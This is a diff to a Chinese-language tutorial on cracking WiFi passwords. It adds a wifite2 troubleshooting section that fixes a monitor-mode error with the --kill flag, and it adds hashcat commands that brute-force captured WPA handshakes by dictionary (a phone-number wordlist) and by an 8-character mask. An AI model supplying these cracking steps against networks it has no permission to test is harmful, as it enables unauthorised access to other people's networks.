@@ -12,10 +12,37 @@ wifite2仓库链接 https://github.com/derv82/wifite2
 
 wifite2捕获握手网络包的视频 https://www.youtube.com/watch?v=qpnpI_mF3Aw
 
-```bash
-sudo wifite --kill
-```
+### Error: Cannot find None with Mode:Monitor
 
+<details>
+<summary>Click to expand</summary>
+
+```bash
+└─$ sudo ./Wifite.py
+[sudo] password for kali: 
+   .               .    
+ .´  ·  .     .  ·  `.  wifite 2.2.5
+ :  :  :  (¯)  :  :  :  automated wireless auditor
+ `.  ·  ` /¯\ ´  ·  .´  https://github.com/derv82/wifite2
+   `     /¯¯¯\     ´    
+
+ [!] Warning: Recommended app pyrit was not found. install @ https://github.com/JPaulMora/Pyrit/wiki
+ [!] Warning: Recommended app hcxpcaptool was not found. install @ https://github.com/ZerBea/hcxtools
+ [!] Conflicting processes: NetworkManager (PID 572), wpa_supplicant (PID 2746)
+ [!] If you have problems: kill -9 PID or re-run wifite with --kill)
+
+    Interface   PHY   Driver              Chipset                                                                                                                                            
+ [!]  Exception: Cannot find None with Mode:Monitor                                                                                                                                          
+                                                                                                                                                                                             
+ [!] Exiting       
+```
+</details>
+
+报错原因是存在进程冲突，按照提示在上述命令后加`--kill`
+
+```bash
+sudo ./Wifite.py --kill
+```
 ## step 3: 暴力破解握手包 -- hashcat 
 
 https://hashcat.net/hashcat/
@@ -36,9 +63,17 @@ phone number generator https://github.com/asaotomo/makephonedict
 
 ### 跑包
 
+**跑字典**
 ```ps
 .\hashcat.exe -a 0 -m 22000 -o result.txt ..\672949_1694932864.hc22000 ..\phone_number_sh.txt
 ```
+
+**根据掩码进行破解**
+
+```ps
+.\hashcat.exe -a3 -m 22000 -o result.txt ..\604\25413_1695390442.hc22000 -1 abcdefghijklmnpqrstuvwxyz0123456789 ?1?1?1?1?1?1?1?1 
+```
+
 
 ## FAQ 
 
